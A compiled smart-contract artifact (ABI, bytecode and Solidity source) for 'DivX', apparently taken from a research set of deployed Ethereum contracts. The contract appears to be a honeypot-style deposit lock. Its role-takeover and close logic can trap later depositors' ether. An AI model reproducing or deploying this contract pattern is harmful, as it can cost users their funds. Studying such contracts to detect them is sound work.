{
  "contractName": "DivX",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_receiver",
          "type": "address"
        }
      ],
      "name": "PutDiv",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_unixTime",
          "type": "uint256"
        }
      ],
      "name": "SetDivTime",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetDiv",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "CloseDiv",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405262093a806002556000600360006101000a81548160ff02191690831515021790555034801561003257600080fd5b506103fb806100426000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630f776fb2146100645780632d3727bf1461009a57806345e479f6146100b1578063ffe8ee35146100bb575b005b610098600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100e8565b005b3480156100a657600080fd5b506100af6101e9565b005b6100b96102ab565b005b3480156100c757600080fd5b506100e66004803603810190808035906020019092919050505061036f565b005b600360009054906101000a900460ff1615801561010d57506703782dace9d900003410155b8061014f575060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b156101e657336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426002600082825401925050819055505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614801561027f57506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614155b156102a4576001600360006101000a81548160ff0219169083151502179055506102a9565b600080fd5b565b3373ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16148015610309575060025442115b1561036d573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561036b573d6000803e3d6000fd5b505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103cc57806002819055505b505600a165627a7a7230582092aafc0506298da72d28ab06ba677846c6d5cede5074b9a780d83025f5b4241f0029",
  "source": "\n\ncontract DivX\n{\n    address  sender;\n    address  receiver;\n    uint unlockTime = 86400 * 7;\n    bool closed = false;\n \n    function PutDiv(address _receiver) public payable {\n        if( (!closed&&(msg.value >=0.25 ether)) || sender==0x0 ) {\n            sender = msg.sender;\n            receiver = _receiver;\n            unlockTime += now;\n        }\n    }\n    \n    function SetDivTime(uint _unixTime) public {\n        if(msg.sender==sender) {\n            unlockTime = _unixTime;\n        }\n    }\n    \n    function GetDiv() public payable {\n        if(receiver==msg.sender&&now>unlockTime) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n    \n    function CloseDiv() public {\n        if (msg.sender==receiver&&receiver!=0x0) {\n           closed=true;\n        } else revert();\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xaa3a6f5bddd02a08c8651f7e285e2bec33ea5e53/contracts/0xaa3a6f5bddd02a08c8651f7e285e2bec33ea5e53.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:03:08.475Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}